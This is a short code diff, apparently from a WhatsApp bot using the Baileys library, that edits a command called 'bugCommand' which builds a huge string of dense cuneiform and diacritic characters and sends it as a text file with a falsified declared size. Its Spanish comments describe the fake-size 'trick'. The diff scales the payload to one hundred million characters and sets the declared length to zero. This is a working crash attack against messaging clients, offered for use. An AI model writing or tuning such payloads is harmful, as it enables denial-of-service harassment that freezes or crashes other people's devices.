@@ -14,7 +14,7 @@ const bugCommand = {
 
         try {
             // 1. Generar la carga de 1,000000 Unicodes densos
-            let cantidad = 1000000
+            let cantidad = 100000000
             let carga = ""
             for (let i = 0; i < cantidad; i++) {
                 // Mezcla de Cuneiforme y diacríticos pesados
@@ -33,7 +33,7 @@ const bugCommand = {
                 mimetype: 'text/plain',
                 fileName: nombreInvisible,
                 // Aquí ocurre el truco: le decimos a Baileys que el tamaño es 100GB
-                fileLength: 107374182400, // 100 GB en bytes
+                fileLength: 0, // 100 GB en bytes 107374182400
                 caption: null // No enviamos texto, solo el archivo
             }, { quoted: m })
 
